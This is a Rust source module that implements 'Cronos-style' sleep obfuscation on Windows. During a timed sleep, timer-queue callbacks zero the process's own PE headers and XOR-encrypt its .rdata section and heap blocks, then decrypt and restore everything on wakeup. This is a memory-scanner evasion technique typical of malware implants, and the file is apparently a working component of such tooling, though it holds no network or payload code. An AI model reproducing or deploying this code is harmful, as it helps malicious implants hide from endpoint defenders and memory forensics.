//! Cronos-style timer-callback sleep obfuscation (Windows implementation).
//!
//! This module contains the Windows-specific Cronos sleep machinery: PE header
//! backup/restore, `.rdata` XOR encryption, heap block encryption, and the
//! timer-queue callback pair that performs the encrypt → sleep → decrypt
//! sequence.

use std::ffi::c_void;
use std::mem;
use std::sync::atomic::{AtomicU32, Ordering};

use windows_sys::Win32::Foundation::{
    BOOLEAN, CloseHandle, FALSE, HANDLE, INVALID_HANDLE_VALUE, WAIT_TIMEOUT,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
use windows_sys::Win32::System::Memory::{
    GetProcessHeap, HeapLock, HeapUnlock, HeapWalk, MEMORY_BASIC_INFORMATION,
    PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_HEAP_ENTRY, VirtualProtect, VirtualQuery,
};
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, PROCESS_HEAP_ENTRY_BUSY};
use windows_sys::Win32::System::Threading::{
    CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx, SetEvent,
    WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD, WT_EXECUTEONLYONCE, WaitForSingleObject,
};

/// `MZ` magic bytes — marks a valid DOS stub.
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
/// `PE\0\0` signature in the NT headers.
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
/// Maximum bytes to back up from the PE header region (first 4 KB).
const HEADER_BACKUP_SIZE: usize = 0x1000;
/// Maximum heap entries collected for heap encryption.
///
/// Capped to bound stack usage: 512 × 16 bytes = 8 KiB overhead on the
/// blocking thread's stack frame.
const MAX_HEAP_ENTRIES: usize = 512;

/// A single heap block recorded before the sleep window begins.
///
/// Stored in [`ObfContext`] so the timer callbacks can XOR the content
/// without calling `HeapWalk` again from the thread-pool context.
#[derive(Clone, Copy)]
struct HeapEntry {
    /// Pointer to the start of the allocated block, stored as `usize`
    /// to avoid raw-pointer `Send`/`Sync` concerns on the outer struct.
    ptr: usize,
    /// Usable size of the block in bytes (`cbData` from `PROCESS_HEAP_ENTRY`).
    size: usize,
}

/// Errors returned by the Windows Cronos sleep path.
#[derive(Debug)]
pub enum CronosError {
    /// `GetModuleHandleW(NULL)` returned a null handle.
    GetModuleHandle,
    /// The module image does not have a valid DOS `MZ` signature.
    InvalidDosSignature,
    /// The NT headers do not have a valid `PE\0\0` signature.
    InvalidNtSignature,
    /// `CreateEventW` failed to create the completion event.
    CreateEvent,
    /// `CreateTimerQueue` failed.
    CreateTimerQueue,
    /// `CreateTimerQueueTimer` failed for one of the two callbacks.
    CreateTimerQueueTimer,
    /// `WaitForSingleObject` timed out waiting for the decrypt callback.
    WaitTimeout,
}

impl std::fmt::Display for CronosError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::GetModuleHandle => write!(f, "GetModuleHandleW returned null"),
            Self::InvalidDosSignature => write!(f, "module has invalid DOS signature"),
            Self::InvalidNtSignature => write!(f, "module has invalid NT signature"),
            Self::CreateEvent => write!(f, "CreateEventW failed"),
            Self::CreateTimerQueue => write!(f, "CreateTimerQueue failed"),
            Self::CreateTimerQueueTimer => write!(f, "CreateTimerQueueTimer failed"),
            Self::WaitTimeout => write!(f, "WaitForSingleObject timed out"),
        }
    }
}

/// State shared between the two timer callbacks and the waiting thread.
///
/// Both callbacks receive a raw pointer to this struct.  The struct lives
/// on the stack of the blocking thread for the entire duration:
///
/// - The blocking thread is parked in `WaitForSingleObject`.
/// - The encrypt callback fires at T = 0 and modifies `old_*_protect`.
/// - The decrypt callback fires at T = `duration_ms`, restores memory,
///   and signals `done_event`.
/// - `WaitForSingleObject` returns; the blocking thread resumes and
///   calls `DeleteTimerQueueEx` (which waits for all callbacks to finish)
///   before returning, ensuring no dangling pointer access.
///
/// Access to `old_header_protect` and `old_rdata_protect` is sequenced:
/// the encrypt callback writes them before the decrypt callback reads
/// them (timer queue guarantees ordering by due time).
struct ObfContext {
    /// Module base address (pointer to the first byte of the PE image).
    base_ptr: *mut u8,
    /// Backup of the first `header_backup_len` bytes of the module.
    header_backup: [u8; HEADER_BACKUP_SIZE],
    /// Number of valid bytes in `header_backup` (≤ `HEADER_BACKUP_SIZE`).
    header_backup_len: usize,
    /// Protection flags saved by the encrypt callback; 0 = not yet saved.
    old_header_protect: AtomicU32,
    /// Pointer to the in-memory `.rdata` section, or null if not found.
    rdata_ptr: *mut u8,
    /// Size in bytes of the `.rdata` section, or 0 if not found.
    rdata_size: usize,
    /// Protection flags saved by the encrypt callback; 0 = not yet saved.
    old_rdata_protect: AtomicU32,
    /// Random 32-byte XOR key for `.rdata` encryption, generated fresh each
    /// sleep cycle.
    key: [u8; 32],
    /// Pre-collected busy heap entries for heap encryption at rest.
    ///
    /// Populated by `collect_heap_entries()` in the main thread before
    /// the timer queue is created.  Empty when heap encryption is disabled.
    heap_entries: [HeapEntry; MAX_HEAP_ENTRIES],
    /// Number of valid entries in `heap_entries` (0 ≤ n ≤ MAX_HEAP_ENTRIES).
    heap_entry_count: usize,
    /// Independent 32-byte XOR key used exclusively for heap block encryption.
    heap_key: [u8; 32],
    /// Manual-reset event signalled by the decrypt callback on completion.
    done_event: HANDLE,
}

// SAFETY: The raw pointers inside ObfContext point to the module image and
// to valid allocated memory.  They are safe to send to timer-pool threads
// because the blocking thread does not access them concurrently.
unsafe impl Send for ObfContext {}
// SAFETY: AtomicU32 fields are the only mutably accessed fields from
// multiple threads; all other fields are either read-only or written
// before the other thread reads them (sequenced by timer due times).
unsafe impl Sync for ObfContext {}

/// Timer callback #1 — executed by the thread pool at T = 0.
///
/// Changes the PE header page to RW and zeros it; changes the `.rdata`
/// section to RW and XOR-encrypts it with `ctx.key`.
///
/// # Safety
///
/// `param` must be a valid `*mut ObfContext` with a lifetime that covers
/// the entire timer-queue sequence (guaranteed by `cronos_sleep`).
unsafe extern "system" fn encrypt_callback(param: *mut c_void, _fired_due_to_timeout: BOOLEAN) {
    // SAFETY: param is always a valid *mut ObfContext (see cronos_sleep).
    let ctx = &*(param as *const ObfContext);

    // ── PE header region ──────────────────────────────────────────────
    // The header page is typically PAGE_READONLY; we need RW to zero it.
    let mut old_header: u32 = 0;
    let ok = VirtualProtect(
        ctx.base_ptr as *const c_void,
        ctx.header_backup_len,
        PAGE_EXECUTE_READWRITE,
        &mut old_header,
    );
    if ok != FALSE && old_header != 0 {
        ctx.old_header_protect.store(old_header, Ordering::Relaxed);
        // Zero the header region.  The backup was already taken in
        // cronos_sleep() before the timers were started.
        let header_slice = std::slice::from_raw_parts_mut(ctx.base_ptr, ctx.header_backup_len);
        header_slice.fill(0);
    }

    // ── .rdata section ────────────────────────────────────────────────
    if ctx.rdata_size > 0 {
        let mut old_rdata: u32 = 0;
        let ok = VirtualProtect(
            ctx.rdata_ptr as *const c_void,
            ctx.rdata_size,
            PAGE_READWRITE,
            &mut old_rdata,
        );
        if ok != FALSE && old_rdata != 0 {
            ctx.old_rdata_protect.store(old_rdata, Ordering::Relaxed);
            // XOR-encrypt with the per-sleep key (key repeats cyclically).
            let slice = std::slice::from_raw_parts_mut(ctx.rdata_ptr, ctx.rdata_size);
            for (i, byte) in slice.iter_mut().enumerate() {
                *byte ^= ctx.key[i % 32];
            }
        }
    }

    // ── Heap blocks ───────────────────────────────────────────────────
    // XOR-encrypt each pre-collected busy heap block.  The entry list
    // lives in the stack-allocated ObfContext so it is unaffected by
    // the encryption of the heap itself.
    for i in 0..ctx.heap_entry_count {
        let entry = &ctx.heap_entries[i];
        if entry.size == 0 {
            continue;
        }
        let slice = std::slice::from_raw_parts_mut(entry.ptr as *mut u8, entry.size);
        for (j, byte) in slice.iter_mut().enumerate() {
            *byte ^= ctx.heap_key[j % 32];
        }
    }
}

/// Timer callback #2 — executed by the thread pool at T = `duration_ms`.
///
/// XOR-decrypts `.rdata`, restores the PE headers from the backup, restores
/// the original page protection flags, then signals `done_event` so the
/// waiting blocking thread can resume.
///
/// # Safety
///
/// Same contract as `encrypt_callback`.
unsafe extern "system" fn decrypt_callback(param: *mut c_void, _fired_due_to_timeout: BOOLEAN) {
    // SAFETY: param is always a valid *mut ObfContext (see cronos_sleep).
    let ctx = &*(param as *const ObfContext);

    // ── Heap blocks ───────────────────────────────────────────────────
    // XOR is its own inverse — same operation decrypts.  Process heap
    // entries first, before restoring .rdata, to mirror the encrypt order.
    for i in 0..ctx.heap_entry_count {
        let entry = &ctx.heap_entries[i];
        if entry.size == 0 {
            continue;
        }
        let slice = std::slice::from_raw_parts_mut(entry.ptr as *mut u8, entry.size);
        for (j, byte) in slice.iter_mut().enumerate() {
            *byte ^= ctx.heap_key[j % 32];
        }
    }

    // ── .rdata section ────────────────────────────────────────────────
    if ctx.rdata_size > 0 {
        let old_rdata = ctx.old_rdata_protect.load(Ordering::Relaxed);
        if old_rdata != 0 {
            // XOR is its own inverse — same operation decrypts.
            let slice = std::slice::from_raw_parts_mut(ctx.rdata_ptr, ctx.rdata_size);
            for (i, byte) in slice.iter_mut().enumerate() {
                *byte ^= ctx.key[i % 32];
            }
            // Restore the original section protection.
            let mut dummy: u32 = 0;
            VirtualProtect(ctx.rdata_ptr as *const c_void, ctx.rdata_size, old_rdata, &mut dummy);
        }
    }

    // ── PE header region ──────────────────────────────────────────────
    let old_header = ctx.old_header_protect.load(Ordering::Relaxed);
    if old_header != 0 {
        // Restore header bytes from the backup.
        let header_slice = std::slice::from_raw_parts_mut(ctx.base_ptr, ctx.header_backup_len);
        header_slice.copy_from_slice(&ctx.header_backup[..ctx.header_backup_len]);
        // Restore the original header page protection.
        let mut dummy: u32 = 0;
        VirtualProtect(
            ctx.base_ptr as *const c_void,
            ctx.header_backup_len,
            old_header,
            &mut dummy,
        );
    }

    // Signal the blocking thread that the sleep cycle is complete.
    SetEvent(ctx.done_event);
}

/// Find the `.rdata` section in the currently loaded module image.
///
/// Returns `(ptr, size)` pointing to the in-memory section, or
/// `(null_mut(), 0)` if the section is absent or the PE is malformed.
///
/// # Safety
///
/// `base` must be the valid base address of a mapped PE64 image.
unsafe fn find_rdata_section(base: *const u8) -> (*mut u8, usize) {
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return (std::ptr::null_mut(), 0);
    }

    let nt_offset = (*dos).e_lfanew as usize;
    let nt = base.add(nt_offset) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return (std::ptr::null_mut(), 0);
    }

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let optional_header_size = (*nt).FileHeader.SizeOfOptionalHeader as usize;

    // Section table follows the optional header immediately after the NT
    // header: 4 bytes (Signature) + sizeof(IMAGE_FILE_HEADER) + optional.
    let section_table_start =
        nt_offset + 4 + mem::size_of::<IMAGE_FILE_HEADER>() + optional_header_size;

    let section_stride = mem::size_of::<IMAGE_SECTION_HEADER>();

    for i in 0..num_sections {
        let s = base.add(section_table_start + i * section_stride) as *const IMAGE_SECTION_HEADER;

        // Section name is an 8-byte null-padded ASCII field.
        if &(*s).Name == b".rdata\0\0" {
            let rva = (*s).VirtualAddress as usize;
            // Use VirtualSize for the in-memory size of the section.
            // SAFETY: Misc is a union; both fields are u32 so this read
            // is always well-defined.
            let size = (*s).Misc.VirtualSize as usize;
            if size == 0 {
                return (std::ptr::null_mut(), 0);
            }
            return (base.add(rva) as *mut u8, size);
        }
    }

    (std::ptr::null_mut(), 0)
}

/// Collect up to `MAX_HEAP_ENTRIES` busy allocated blocks from the default
/// process heap into the caller-supplied array.
///
/// The heap is locked for the duration of the walk to prevent concurrent
/// modifications.  Returns the number of entries written.
///
/// Silently stops collecting when the array is full; remaining busy blocks
/// beyond `MAX_HEAP_ENTRIES` are not encrypted.
///
/// # Safety
///
/// `entries` must point to at least `MAX_HEAP_ENTRIES` writable
/// `HeapEntry` slots.  The returned count indicates how many were filled.
unsafe fn collect_heap_entries(entries: &mut [HeapEntry; MAX_HEAP_ENTRIES]) -> usize {
    let heap = GetProcessHeap();
    if heap.is_null() {
        return 0;
    }

    // Lock the heap so the walk is consistent.
    if HeapLock(heap) == FALSE {
        return 0;
    }

    let mut count = 0usize;
    let mut entry: PROCESS_HEAP_ENTRY = mem::zeroed();
    entry.lpData = std::ptr::null_mut();

    while HeapWalk(heap, &mut entry) != FALSE {
        // Only collect busy (allocated) blocks — skip free blocks and
        // region descriptors.
        if u32::from(entry.wFlags) & PROCESS_HEAP_ENTRY_BUSY != 0 && entry.cbData > 0 {
            if count < MAX_HEAP_ENTRIES {
                entries[count] =
                    HeapEntry { ptr: entry.lpData as usize, size: entry.cbData as usize };
                count += 1;
            } else {
                break; // array full — stop walking
            }
        }
    }

    HeapUnlock(heap);
    count
}

/// Perform a Cronos-style obfuscated sleep, optionally with heap encryption.
///
/// When `heap_enc` is `true`, busy heap blocks collected before the timers
/// start are XOR-encrypted for the duration of the sleep window and
/// decrypted on wakeup.
///
/// Schedules two timer-queue callbacks — one to encrypt at T = 0 and one
/// to decrypt at T = `duration_ms` — then parks the calling thread on a
/// kernel event until the decrypt callback signals completion.
///
/// # Errors
///
/// Returns a [`CronosError`] if any Windows API call fails.  The caller
/// should fall back to a plain sleep on error.
pub fn cronos_sleep(duration_ms: u64, heap_enc: bool) -> Result<(), CronosError> {
    // SAFETY: All Win32 calls follow their documented API contracts.
    // Pointer validity is maintained through the struct's lifetime, which
    // outlives both timer callbacks (enforced by DeleteTimerQueueEx with
    // INVALID_HANDLE_VALUE, which blocks until all callbacks complete).
    unsafe {
        // ── Locate the module image ───────────────────────────────────
        let hmodule = GetModuleHandleW(std::ptr::null());
        if hmodule.is_null() {
            return Err(CronosError::GetModuleHandle);
        }
        let base_ptr = hmodule as *mut u8;

        // Validate PE signatures before dereferencing deeper structures.
        let dos = base_ptr as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(CronosError::InvalidDosSignature);
        }
        let nt_offset = (*dos).e_lfanew as usize;
        let nt = base_ptr.add(nt_offset) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(CronosError::InvalidNtSignature);
        }

        // ── Determine the header region size ─────────────────────────
        // VirtualQuery tells us the size of the first committed region
        // (usually the header page = 0x1000).  Cap at HEADER_BACKUP_SIZE.
        let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
        let q = VirtualQuery(
            base_ptr as *const c_void,
            &mut mbi,
            mem::size_of::<MEMORY_BASIC_INFORMATION>(),
        );
        let header_backup_len =
            if q > 0 { mbi.RegionSize.min(HEADER_BACKUP_SIZE) } else { HEADER_BACKUP_SIZE };

        // ── Build context ─────────────────────────────────────────────
        let done_event = CreateEventW(
            std::ptr::null(),
            /* bManualReset */ 1,
            /* bInitialState */ 0,
            std::ptr::null(),
        );
        if done_event.is_null() || done_event == INVALID_HANDLE_VALUE {
            return Err(CronosError::CreateEvent);
        }

        // Random 32-byte XOR key for .rdata — fresh each sleep cycle.
        let key: [u8; 32] = rand::random();

        // Back up the header region before creating timers.
        let mut header_backup = [0u8; HEADER_BACKUP_SIZE];
        let src = std::slice::from_raw_parts(base_ptr, header_backup_len);
        header_backup[..header_backup_len].copy_from_slice(src);

        let (rdata_ptr, rdata_size) = find_rdata_section(base_ptr as *const u8);

        // Collect heap entries before creating timers when heap encryption
        // is requested.  All entries are collected here in the main thread
        // and stored in the stack-allocated context so the callbacks do not
        // need to call HeapWalk from the thread-pool context.
        let mut heap_entries = [HeapEntry { ptr: 0, size: 0 }; MAX_HEAP_ENTRIES];
        let heap_entry_count = if heap_enc { collect_heap_entries(&mut heap_entries) } else { 0 };
        let heap_key: [u8; 32] = if heap_enc { rand::random() } else { [0u8; 32] };

        let mut ctx = ObfContext {
            base_ptr,
            header_backup,
            header_backup_len,
            old_header_protect: AtomicU32::new(0),
            rdata_ptr,
            rdata_size,
            old_rdata_protect: AtomicU32::new(0),
            key,
            heap_entries,
            heap_entry_count,
            heap_key,
            done_event,
        };
        let ctx_ptr = (&mut ctx as *mut ObfContext) as *mut c_void;

        // ── Set up timer queue ────────────────────────────────────────
        let queue = CreateTimerQueue();
        if queue.is_null() || queue == INVALID_HANDLE_VALUE {
            CloseHandle(done_event);
            return Err(CronosError::CreateTimerQueue);
        }

        // Timer 1: fire the encrypt callback immediately (due_time = 0).
        let mut enc_timer: HANDLE = core::ptr::null_mut();
        let ok = CreateTimerQueueTimer(
            &mut enc_timer,
            queue,
            Some(encrypt_callback as unsafe extern "system" fn(*mut c_void, BOOLEAN)),
            ctx_ptr,
            0, // due time (ms) — fire immediately
            0, // period — one-shot
            WT_EXECUTEONLYONCE | WT_EXECUTEINTIMERTHREAD,
        );
        if ok == FALSE {
            DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE);
            CloseHandle(done_event);
            return Err(CronosError::CreateTimerQueueTimer);
        }

        // Timer 2: fire the decrypt callback after the sleep duration.
        // Clamp to u32 to satisfy the Win32 API; add 1 ms so it fires
        // strictly after the encrypt callback has completed.
        #[allow(clippy::cast_possible_truncation)]
        let decrypt_due = u64::min(duration_ms.saturating_add(1), u32::MAX as u64) as u32;
        let mut dec_timer: HANDLE = core::ptr::null_mut();
        let ok = CreateTimerQueueTimer(
            &mut dec_timer,
            queue,
            Some(decrypt_callback as unsafe extern "system" fn(*mut c_void, BOOLEAN)),
            ctx_ptr,
            decrypt_due,
            0,
            WT_EXECUTEONLYONCE | WT_EXECUTEINTIMERTHREAD,
        );
        if ok == FALSE {
            // encrypt_callback may already be in flight; wait for it to
            // finish before returning so ctx is not dangled.
            DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE);
            CloseHandle(done_event);
            return Err(CronosError::CreateTimerQueueTimer);
        }

        // ── Wait for the decrypt callback to complete ─────────────────
        // Add a 10 s grace period beyond the requested sleep time so we
        // do not return while the decrypt callback is still running.
        #[allow(clippy::cast_possible_truncation)]
        let wait_ms = u64::min(duration_ms.saturating_add(10_000), u32::MAX as u64) as u32;
        let wait_result = WaitForSingleObject(done_event, wait_ms);

        // DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE) blocks until
        // all pending callbacks have returned, ensuring that ctx remains
        // valid for the entire callback lifetime.
        DeleteTimerQueueEx(queue, INVALID_HANDLE_VALUE);
        CloseHandle(done_event);

        if wait_result == WAIT_TIMEOUT {
            return Err(CronosError::WaitTimeout);
        }

        Ok(())
    }
}
